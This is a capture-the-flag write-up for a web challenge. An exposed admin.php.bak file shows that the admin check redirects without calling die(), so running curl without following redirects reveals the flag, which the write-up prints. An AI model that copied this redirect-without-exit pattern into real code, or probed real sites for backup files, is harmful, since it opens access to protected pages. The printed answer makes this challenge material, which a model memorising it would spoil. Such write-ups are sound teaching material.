# You Should Die

### Category

Web

### Description

Could you retrieve the flag from this Marketing company ?

URL : http://challs.heroctf.fr:XXXX

Format : **Hero{flag}**<br>
Author : **xanhacks**

### Write up

If you look at the source code of the page, you can see this HTML comment :

```html
<!--
    For developper :
        Do not forget to remove admin.php.bak !
    
    Regards,
    Security Team
-->
```

**admin.php.bak** :

```php
<?php

if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

if (!(isset($_SESSION["logged"]) && $_SESSION["logged"] === true)) {
    header("Location: /index.php?error=You are not admin !");
}

echo "Flag : " . getenv("FLAG_MARK3TING");
```

So, if we are not logged in, the page will redirect us to **/index.php**. But the correct code should be :

```php
if (!(isset($_SESSION["logged"]) && $_SESSION["logged"] === true)) {
    header("Location: /index.php?error=You are not admin !");
    die();
}
```

As the **die()** function is missing, the rest of the page is still executed.

If we use **curl** to get the **/admin.php** page with **-L** for **follow redirection**, we obtain the **/index.php** page.

```html
$ curl -s "http://challs.heroctf.fr:XXXX/admin.php" -L | head
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>Mark3ting agency</title>
        <link rel="icon" type="image/x-icon" href="assets/img/favicon.ico" />
        <!-- Font Awesome icons (free version)-->
```

However, if we do not want to follow redirection, we see the rest of the page.

```shell
$ curl -s "http://challs.heroctf.fr:XXXX/admin.php"
Flag : Hero{r3d1r3c710n_c4n_b3_d4n63r0u5_57395379}
```

### Flag

Hero{r3d1r3c710n_c4n_b3_d4n63r0u5_57395379}
